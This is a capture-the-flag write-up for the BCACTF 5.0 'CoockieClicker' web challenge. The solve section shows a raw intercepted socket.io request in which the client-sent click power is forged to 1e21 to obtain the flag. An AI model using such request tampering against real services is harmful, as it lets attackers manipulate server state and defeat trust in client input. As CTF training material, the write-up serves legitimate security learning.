# BCACTF 5.0

## CoockieClicker - 100 | webex

### Description: 
You need to get 1e20 cookies, hope you have fun clicking!


Web servers:

`challs.bcactf.com:31386`

Static resources:
 [here](https://arcs-s3-repo.nyc3.cdn.digitaloceanspaces.com/cookie-clicker/provided.js).


### Solve :

so we are given a page that increments the points in every click 

after we intercepted with burp and change the requesst to 

```
POST /socket.io/?EIO=4&transport=polling&t=O_-C4nL&sid=L4lYyQZn0TXdXj6GAADY HTTP/1.1
Host: challs.bcactf.com:31829
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 53
Origin: http://challs.bcactf.com:31829
Connection: close
Referer: http://challs.bcactf.com:31829//

42["click","{\"power\":1e21,\"value\":}"]
```

we got our flag 


